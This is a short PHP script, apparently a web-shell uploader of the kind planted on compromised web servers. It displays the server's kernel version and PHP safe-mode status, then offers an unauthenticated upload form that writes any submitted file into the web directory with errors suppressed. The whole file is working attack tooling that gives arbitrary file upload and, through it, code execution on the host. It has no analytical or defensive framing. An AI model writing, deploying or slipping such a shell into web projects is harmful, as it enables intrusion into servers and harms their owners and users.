<?php 

echo '<center><b><br><br>"Plan"<br></b></center>';
echo '<center><b><br><br>Kernel Version : '.php_uname().'<br><br></center></b><br><br>';
$mod = (ini_get ("safe_mode"));
if ($mod == 1)   {
echo "<font color='#FF0000'><center>safe mode is : </center>font color='#FF0000'><center>ON</font></center><center> (secure)</center></font>
 ";
} else {
echo "
<font color='#FF0000'><center> safe mode is: <font color='#008000'>OFF</font></center>
<font color='#008000'><center>(not secure)</center></font></center>";
}
echo '<center><b><br><br> Upload your files : <form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"><br>';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center><br>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b><center>Upload D0Ne !!!</center></b><br><br>'; }
	else { echo '<b>Error ! x/ </b><br><br>'; }

}

echo '<center><b><br><br><br><br>"2022"<br></b></center>';

?>

